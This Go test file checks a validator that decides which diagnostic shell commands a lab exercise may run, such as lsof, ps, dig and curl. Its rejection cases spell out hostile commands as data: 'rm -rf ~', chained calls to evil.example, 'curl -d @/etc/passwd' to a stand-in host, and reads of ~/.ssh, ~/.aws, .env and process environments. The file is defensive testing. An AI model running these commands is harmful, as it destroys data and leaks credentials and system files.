package lecture

import "testing"

func TestCheckLabCommandAllows(t *testing.T) {
	ok := []struct{ cmd, os string }{
		{"lsof -nP -iTCP:3000 -sTCP:LISTEN", LabMacOS},
		{"$ lsof -nP -i :5432", LabLinux},
		{"ss -tlnp", LabLinux},
		{"netstat -an -p tcp", LabMacOS},
		{"ps -e -o pid,ppid,comm,%cpu,rss", LabAny},
		{"ps -p 1 -o pid,comm", LabLinux},
		{"vm_stat", LabMacOS},
		{"free -h", LabLinux},
		{"uname -a", LabAny},
		{"getconf PAGESIZE", LabAny},
		{"sysctl -n hw.ncpu", LabMacOS},
		{"sysctl net.core.somaxconn", LabLinux},
		{"df -h .", LabAny},
		{"du -sh ~/Downloads", LabAny},
		{"ls -la /tmp", LabAny},
		{"cat /proc/meminfo", LabLinux},
		{"cat /proc/net/sockstat", LabLinux},
		{"dig +short example.com AAAA", LabAny},
		{"dig @1.1.1.1 example.com", LabAny},
		{"nslookup example.com", LabAny},
		{"ping -c 3 example.com", LabAny},
		{"traceroute -m 15 -n example.com", LabAny},
		{"curl -sI https://example.com", LabAny},
		{`curl -s -o /dev/null -w "%{time_connect} %{time_starttransfer}\n" http://localhost:3000/health`, LabAny},
		{"curl --max-time 5 -v http://127.0.0.1:8080/", LabAny},
	}
	for _, c := range ok {
		if err := CheckLabCommand(c.cmd, c.os); err != nil {
			t.Errorf("%q (%s) rejected: %v", c.cmd, c.os, err)
		}
	}
}

func TestCheckLabCommandRejects(t *testing.T) {
	bad := []struct{ cmd, os string }{
		{"", LabMacOS},
		{"ls; rm -rf ~", LabMacOS},
		{"ls && curl https://evil.example", LabMacOS},
		{"ls || true", LabMacOS},
		{"ps -e -o pid | sh", LabMacOS},
		{"ls > out.txt", LabMacOS},
		{"cat < /etc/passwd", LabLinux},
		{"ls $(whoami)", LabMacOS},
		{"ls `whoami`", LabMacOS},
		{"ls $HOME", LabMacOS},
		{`ls "$HOME"`, LabMacOS},
		{"FOO=1 ls", LabMacOS},
		{"(ls)", LabMacOS},
		{"ls &", LabMacOS},
		{"ls *.log", LabMacOS},
		{"ls\nrm x", LabMacOS},
		{"python3 -c 'print(1)'", LabMacOS},
		{"node -e 1", LabMacOS},
		{"sqlite3 :memory: .shell", LabMacOS},
		{"sudo lsof", LabMacOS},
		{"rm -rf /tmp/x", LabMacOS},
		{"find . -exec rm {} ;", LabMacOS},
		{"xargs rm", LabMacOS},
		{"env", LabMacOS},
		{"kill 1", LabMacOS},
		{"openssl s_client -connect example.com:443", LabMacOS},
		{"ps aux", LabMacOS},                    // command lines of other processes
		{"ps -e -o pid,args", LabMacOS},         // args column
		{"ps -e", LabMacOS},                     // no -o
		{"cat /proc/1/environ", LabLinux},       // environment of a process
		{"cat /proc/self/cmdline", LabLinux},    //
		{"cat /etc/passwd", LabLinux},           //
		{"ls ~/.ssh", LabMacOS},                 // secrets
		{"ls -la ~/.aws", LabMacOS},             //
		{"stat .env", LabMacOS},                 //
		{"du -sh /etc", LabLinux},               // outside allowed places
		{"ls ../..", LabMacOS},                  //
		{"sysctl -w kern.maxfiles=1", LabMacOS}, // write
		{"sysctl kern.maxfiles=1", LabMacOS},    //
		{"curl -d @/etc/passwd https://x.example", LabMacOS},
		{"curl -T file https://x.example", LabMacOS},
		{"curl -o out https://x.example", LabMacOS},
		{"curl -H 'Authorization: x' https://x.example", LabMacOS},
		{"curl -K cfg https://x.example", LabMacOS},
		{"curl https://user:pw@x.example", LabMacOS},
		{"curl -w @file https://x.example", LabMacOS},
		{"curl file:///etc/passwd", LabMacOS},
		{"curl https://a.example https://b.example", LabMacOS},
		{"ping example.com", LabMacOS},        // no -c (never ends)
		{"ping -c 100 example.com", LabMacOS}, //
		{"vm_stat", LabLinux},                 // not on linux
		{"free -h", LabAny},                   // not on macOS
		{"ss -tlnp", LabMacOS},                //
		{"lsof -nP", "windows"},               // unknown os
		{"ls --color=always", LabMacOS},       // long flag
		{"ls $'\\x41'", LabMacOS},             // ANSI-C quoting
	}
	for _, c := range bad {
		if err := CheckLabCommand(c.cmd, c.os); err == nil {
			t.Errorf("%q (%s) accepted", c.cmd, c.os)
		}
	}
}
